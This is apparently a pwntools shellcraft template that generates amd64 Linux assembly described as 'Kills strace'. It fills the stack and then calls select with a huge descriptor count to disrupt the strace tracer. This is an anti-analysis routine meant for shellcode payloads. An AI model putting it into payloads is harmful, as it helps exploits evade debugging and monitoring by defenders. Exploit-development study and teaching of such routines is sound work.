<%
from pwnlib.constants import SYS_select
from pwnlib.shellcraft.amd64.linux import syscall, write
from pwnlib.shellcraft.amd64 import push, mov, pushstr
from pwnlib.shellcraft import common
from random import randint
%>
<%docstring>
Kills strace
</%docstring>
<%
large_value = randint(0x10000000, 0xffffffff)
dos_loop1 = common.label('dos_loop1')
dos_loop2 = common.label('dos_loop2')
count     = 0x4000
big_val   = randint(0x10000000, 0x7fffffff)
%>
    push rbp
    mov  rbp, rsp

## Allocate a lot of stack space
    ${mov('rcx', count)}
${dos_loop1}:
    push -1
    sub  rcx, 1
    test rcx, rcx
    jnz ${dos_loop1}

    mov byte ptr [rsp], 0xf8
    ${syscall(SYS_select, big_val, 'rsp', 0, 0)}

    ${mov('rcx', count)}
${dos_loop2}:
    pop  rax
    sub  rcx, 1
    test rcx, rcx
    jnz ${dos_loop2}

    mov rsp, rbp
    pop rbp
